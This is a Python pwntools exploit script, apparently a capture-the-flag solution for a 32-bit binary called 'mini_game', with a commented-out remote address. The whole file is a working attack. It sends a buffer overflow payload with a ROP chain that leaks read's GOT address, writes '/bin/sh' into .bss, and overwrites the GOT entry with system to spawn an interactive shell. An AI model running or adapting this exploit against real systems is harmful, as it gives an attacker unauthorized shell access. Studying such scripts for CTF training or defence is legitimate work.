from pwn import *

#p = remote('106.10.50.113','9002')
p = process('./mini_game')
e = ELF('./mini_game')
#context(arch='i386',os='linux',endian='little',log_level='debug')
pppr=0x08048c59
pr=0x08048c76

offset=0x9ad60
cmd='/bin/sh'


p.sendline("4")
payload="A"*20
payload+=p32(e.plt['write'])
payload+=p32(pppr)
payload+=p32(1)
payload+=p32(e.got['read'])
payload+=p32(4)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.bss())
payload+=p32(len(cmd)+1)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.got['read'])
payload+=p32(4)

payload+=p32(e.plt['read'])
payload+="AAAA"
payload+=p32(e.bss())

p.sendlineafter('nickname : ',payload)

p.recvuntil("\x0a")

read=u32(p.recv(4))
print "read :"+hex(read)
system = read - offset
print "system :"+hex(system)

p.sendline(cmd)
p.sendline(p32(system))
p.interactive()
